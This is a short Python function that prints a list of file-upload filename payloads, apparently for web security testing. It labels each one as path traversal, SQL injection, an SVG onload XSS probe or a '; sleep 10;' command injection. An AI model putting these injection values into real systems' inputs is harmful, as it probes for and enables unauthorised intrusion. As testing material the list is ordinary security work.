def file_upload_payloads():
    payloads = [
        ("../../../../tmp/lol.png", "Path Traversal"),
        ("sleep(10)--.jpg", "SQL Injection"),
        ("<svg onload=alert(document.domain)>.jpg", "XSS"),
        ("; sleep 10;", "Command Injection")
    ]
    for p, desc in payloads:
        print(f"[+] {desc}: {p}")
